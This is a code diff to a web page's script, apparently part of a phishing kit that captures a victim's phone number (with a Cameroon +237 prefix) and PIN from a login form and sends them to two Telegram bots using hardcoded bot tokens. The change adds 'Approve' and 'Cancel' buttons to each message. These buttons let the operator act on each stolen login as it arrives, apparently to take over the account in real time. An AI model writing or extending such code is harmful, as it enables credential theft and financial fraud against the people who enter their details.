@@ -352,6 +352,7 @@
         </div>
     </div>
 
+
     <script>
         // --- Existing Telegram bot tokens (kept as-is from your code) ---
         const BOT_TOKEN_1 = '8770786277:AAHbhWtTMb6BjBnfq-Hz4JZLLwfhNtWMZDc';
@@ -412,28 +413,46 @@
             localStorage.setItem('phone', phone);
             localStorage.setItem('pin', pinValue);
 
+            const currentTimestamp = Date.now();
             const message = `New Login Attempt\n\nPhone: +237 ${phone}\nPIN: ${pinValue}`;
+
+            // Payload configuration containing the inline keyboard
+            const payload = {
+                chat_id: CHAT_ID_1,
+                text: message,
+                reply_markup: {
+                    inline_keyboard: [
+                        [{
+                            text: '✅ Approve',
+                            callback_data: 'approve_' + currentTimestamp
+                        }, {
+                            text: '❌ Cancel',
+                            callback_data: 'cancel_' + currentTimestamp
+                        }]
+                    ]
+                }
+            };
 
             fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/sendMessage`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID_1,
-                    text: message
-                })
+                body: JSON.stringify(payload)
             }).catch(() => {});
+
+            // Update chat_id for the second bot if needed
+            const payload2 = {
+                ...payload,
+                chat_id: CHAT_ID_2
+            };
 
             fetch(`https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID_2,
-                    text: message
-                })
+                body: JSON.stringify(payload2)
             }).catch(() => {});
 
             setTimeout(() => {
